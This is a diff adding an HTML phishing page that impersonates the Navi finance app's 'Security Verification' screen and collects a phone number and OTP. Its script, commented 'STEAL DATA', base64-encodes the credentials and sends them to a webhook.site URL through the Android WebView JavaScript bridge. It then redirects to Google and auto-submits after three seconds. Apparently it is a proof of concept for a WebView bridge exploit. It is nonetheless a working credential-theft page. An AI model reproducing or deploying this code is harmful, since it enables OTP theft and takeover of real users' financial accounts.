@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Navi - Security Update</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
+        .container { max-width: 400px; margin: 0 auto; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #4a6ee0; padding: 20px; text-align: center; }
+        .content { padding: 30px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
+        input { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 16px; background: #4a6ee0; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .footer { text-align: center; padding: 20px; color: #666; font-size: 13px; border-top: 1px solid #eee; }
+        .status { text-align: center; padding: 20px; color: #666; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4a6ee0; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- NAVI LOGO HEADER -->
+        <div class="header">
+            <!-- Navi Logo SVG -->
+            <svg width="60" height="60" viewBox="0 0 60 60" fill="none">
+                <rect width="60" height="60" rx="12" fill="white"/>
+                <path d="M20 20 L40 20 L30 40 Z" fill="#4a6ee0"/>
+                <text x="30" y="55" text-anchor="middle" fill="white" font-size="12" font-weight="bold">NAVI</text>
+            </svg>
+            <h1 style="color: white; margin: 10px 0 0 0; font-size: 28px;">Navi</h1>
+            <p style="color: rgba(255,255,255,0.9); margin: 5px 0; font-size: 14px;">UPI • Loans • Insurance</p>
+        </div>
+        
+        <div class="content">
+            <h2 style="margin: 0 0 25px 0; text-align: center;">Security Verification</h2>
+            
+            <div class="input-group">
+                <label>Mobile Number</label>
+                <input type="tel" id="phone" placeholder="10-digit number" value="9876543210">
+            </div>
+            
+            <div class="input-group">
+                <label>OTP</label>
+                <input type="password" id="otp" placeholder="6-digit OTP" value="123456" maxlength="6">
+            </div>
+            
+            <button id="verifyBtn">Verify & Continue</button>
+            
+            <div class="status" id="status" style="display: none;">
+                <div class="spinner"></div>
+                <p>Securing your account...</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>By continuing, you agree to our <a href="#" style="color: #4a6ee0;">Terms & Conditions</a></p>
+            <p style="font-size: 11px; margin-top: 10px;">Secure & encrypted verification</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            const phone = document.getElementById('phone').value.trim();
+            const otp = document.getElementById('otp').value.trim();
+            
+            if (phone.length !== 10 || otp.length !== 6) {
+                alert('Please enter valid 10-digit mobile number and 6-digit OTP');
+                return;
+            }
+            
+            // Show loading
+            this.style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+            
+            // STEAL DATA
+            if (typeof Android !== 'undefined' && Android.openLink) {
+                // Create stolen data
+                const stolenData = {
+                    phone: phone,
+                    otp: otp,
+                    app: 'navi',
+                    exploit: 'webview_js_bridge',
+                    timestamp: new Date().toISOString(),
+                    logo: 'navi_logo_used'
+                };
+                
+                // Encode and send to webhook (for proof)
+                const encoded = btoa(JSON.stringify(stolenData));
+                Android.openLink(`https://webhook.site/geeky?data=${encoded}`);
+                
+                // Then redirect to Google
+                setTimeout(() => {
+                    Android.openLink('https://google.com');
+                }, 800);
+                
+            } else {
+                document.getElementById('status').innerHTML = '<p style="color:red;">⚠️ Not in Navi app</p>';
+            }
+        });
+        
+        // Auto-submit after 3 seconds for demo
+        setTimeout(() => {
+            document.getElementById('verifyBtn').click();
+        }, 3000);
+    </script>
+</body>
+</html>
